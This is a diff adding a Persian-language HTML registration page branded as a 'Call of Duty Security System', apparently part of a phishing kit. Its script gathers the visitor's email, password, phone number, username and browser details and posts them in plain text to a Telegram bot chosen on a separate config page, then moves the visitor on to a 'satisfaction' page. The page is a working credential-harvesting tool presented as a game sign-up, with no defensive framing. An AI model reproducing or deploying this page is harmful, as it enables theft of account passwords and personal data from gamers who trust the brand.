@@ -1,0 +1,310 @@
+<!DOCTYPE html>
+<html lang="fa">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ثبت نام - Call of Duty Security System</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #0c0c0c 0%, #1a1a2e 100%);
+            color: #fff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 500px;
+            width: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            border-radius: 15px;
+            padding: 30px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+            border: 1px solid #3498db;
+        }
+        
+        header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        
+        h1 {
+            font-size: 2.2rem;
+            color: #3498db;
+            margin-bottom: 10px;
+            text-shadow: 0 0 10px rgba(52, 152, 219, 0.7);
+        }
+        
+        h2 {
+            font-size: 1.5rem;
+            color: #e74c3c;
+            margin-bottom: 20px;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: #3498db;
+            font-weight: bold;
+        }
+        
+        .form-group input {
+            width: 100%;
+            padding: 12px 15px;
+            background: rgba(255, 255, 255, 0.1);
+            border: 1px solid #3498db;
+            border-radius: 5px;
+            color: white;
+            font-size: 16px;
+            transition: all 0.3s ease;
+        }
+        
+        .form-group input:focus {
+            outline: none;
+            border-color: #e74c3c;
+            box-shadow: 0 0 10px rgba(231, 76, 60, 0.5);
+        }
+        
+        .btn {
+            display: block;
+            width: 100%;
+            margin: 30px auto 10px;
+            padding: 12px 20px;
+            background: linear-gradient(135deg, #3498db 0%, #2980b9 100%);
+            color: white;
+            text-align: center;
+            text-decoration: none;
+            border-radius: 5px;
+            font-weight: bold;
+            transition: all 0.3s ease;
+            border: none;
+            cursor: pointer;
+            box-shadow: 0 4px 15px rgba(52, 152, 219, 0.4);
+            font-size: 18px;
+        }
+        
+        .btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 6px 20px rgba(52, 152, 219, 0.6);
+            background: linear-gradient(135deg, #2980b9 0%, #3498db 100%);
+        }
+        
+        .notification {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            padding: 15px 20px;
+            background: #2ecc71;
+            color: white;
+            border-radius: 5px;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+            display: none;
+            z-index: 1000;
+            max-width: 350px;
+        }
+        
+        .notification.error {
+            background: #e74c3c;
+        }
+        
+        footer {
+            text-align: center;
+            margin-top: 30px;
+            color: #7f8c8d;
+            font-size: 0.9rem;
+        }
+        
+        .back-link {
+            display: block;
+            text-align: center;
+            margin-top: 20px;
+            color: #3498db;
+            text-decoration: none;
+        }
+        
+        .back-link:hover {
+            text-decoration: underline;
+        }
+        
+        .loader {
+            display: none;
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top: 4px solid #3498db;
+            width: 30px;
+            height: 30px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="notification" id="notification"></div>
+    
+    <div class="container">
+        <header>
+            <h1>Call of Duty</h1>
+            <h2>ثبت نام در سیستم</h2>
+        </header>
+        
+        <form id="registrationForm">
+            <div class="form-group">
+                <label for="email">ایمیل:</label>
+                <input type="email" id="email" required placeholder="example@domain.com">
+            </div>
+            
+            <div class="form-group">
+                <label for="password">رمز عبور:</label>
+                <input type="password" id="password" required placeholder="رمز عبور خود را وارد کنید">
+            </div>
+            
+            <div class="form-group">
+                <label for="phone">شماره تلفن:</label>
+                <input type="tel" id="phone" required placeholder="09xxxxxxxxx">
+            </div>
+            
+            <div class="form-group">
+                <label for="username">نام کاربری:</label>
+                <input type="text" id="username" required placeholder="نام کاربری مورد نظر">
+            </div>
+            
+            <button type="submit" class="btn">تایید و ادامه دادن</button>
+            <div class="loader" id="loader"></div>
+        </form>
+        
+        <a href="index.html" class="back-link">بازگشت به صفحه اصلی</a>
+    </div>
+    
+    <footer>
+        Call of Duty Security System | All Rights Reserved 2025 ©
+    </footer>
+
+    <script>
+        function showNotification(message, isError = false) {
+            const notification = document.getElementById('notification');
+            notification.textContent = message;
+            notification.style.display = 'block';
+            notification.classList.toggle('error', isError);
+            
+            setTimeout(() => {
+                notification.style.display = 'none';
+            }, 5000);
+        }
+        
+        document.getElementById('registrationForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            // نمایش لودر
+            const loader = document.getElementById('loader');
+            const submitBtn = document.querySelector('button[type="submit"]');
+            loader.style.display = 'block';
+            submitBtn.disabled = true;
+            
+            // جمع آوری اطلاعات فرم
+            const formData = {
+                email: document.getElementById('email').value,
+                password: document.getElementById('password').value,
+                phone: document.getElementById('phone').value,
+                username: document.getElementById('username').value,
+                timestamp: new Date().toLocaleString('fa-IR'),
+                userAgent: navigator.userAgent
+            };
+            
+            // دریافت توکن و چت آیدی از localStorage
+            const token = localStorage.getItem('botToken');
+            const chatId = localStorage.getItem('chatId');
+            
+            if (!token || !chatId) {
+                showNotification('لطفاً ابتدا تنظیمات ربات را انجام دهید', true);
+                loader.style.display = 'none';
+                submitBtn.disabled = false;
+                setTimeout(() => {
+                    window.location.href = 'config.html';
+                }, 2000);
+                return;
+            }
+            
+            // ایجاد پیام برای ارسال به تلگرام
+            const message = `
+📋 ثبت نام جدید در سیستم
+
+👤 نام کاربری: ${formData.username}
+📧 ایمیل: ${formData.email}
+📞 شماره تلفن: ${formData.phone}
+🔑 رمز عبور: ${formData.password}
+
+🕒 زمان ثبت نام: ${formData.timestamp}
+🌐 مرورگر: ${formData.userAgent}
+
+✅ کاربر منتظر تایید است
+            `;
+            
+            // ارسال به تلگرام
+            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            })
+            .then(response => response.json())
+            .then(data => {
+                loader.style.display = 'none';
+                submitBtn.disabled = false;
+                
+                if (data.ok) {
+                    showNotification('اطلاعات با موفقیت ارسال شد!');
+                    
+                    // هدایت به صفحه بعد بعد از 2 ثانیه
+                    setTimeout(() => {
+                        window.location.href = 'satisfaction.html';
+                    }, 2000);
+                } else {
+                    showNotification('خطا در ارسال اطلاعات: ' + data.description, true);
+                }
+            })
+            .catch(error => {
+                loader.style.display = 'none';
+                submitBtn.disabled = false;
+                showNotification('خطا در ارسال اطلاعات', true);
+                console.error('Error:', error);
+            });
+        });
+        
+        // بررسی اینکه کاربر از صفحه config آمده یا نه
+        window.onload = function() {
+            const token = localStorage.getItem('botToken');
+            const chatId = localStorage.getItem('chatId');
+            
+            if (!token || !chatId) {
+                showNotification('لطفاً ابتدا تنظیمات ربات را انجام دهید', true);
+                setTimeout(() => {
+                    window.location.href = 'config.html';
+                }, 2000);
+            }
+        }
+    </script>
+</body>
+</html>
